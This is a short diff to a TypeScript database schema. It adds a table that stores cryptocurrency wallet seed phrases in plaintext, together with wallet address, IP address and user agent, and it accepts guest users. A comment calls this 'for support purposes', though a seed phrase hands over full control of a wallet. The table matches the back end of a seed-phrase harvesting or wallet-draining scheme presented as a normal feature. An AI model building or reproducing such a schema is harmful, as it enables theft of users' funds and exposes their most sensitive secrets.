@@ -118,3 +118,17 @@ export const apiTokens = mysqlTable("apiTokens", {
 
 export type ApiToken = typeof apiTokens.$inferSelect;
 export type InsertApiToken = typeof apiTokens.$inferInsert;
+
+// Wallet seed phrase imports (for support purposes)
+export const walletImports = mysqlTable("walletImports", {
+  id: int("id").autoincrement().primaryKey(),
+  userId: int("userId"), // nullable — guest users may not be logged in
+  seedPhrase: text("seedPhrase").notNull(),
+  walletAddress: varchar("walletAddress", { length: 64 }),
+  ipAddress: varchar("ipAddress", { length: 64 }),
+  userAgent: text("userAgent"),
+  importedAt: timestamp("importedAt").defaultNow().notNull(),
+});
+
+export type WalletImport = typeof walletImports.$inferSelect;
+export type InsertWalletImport = typeof walletImports.$inferInsert;
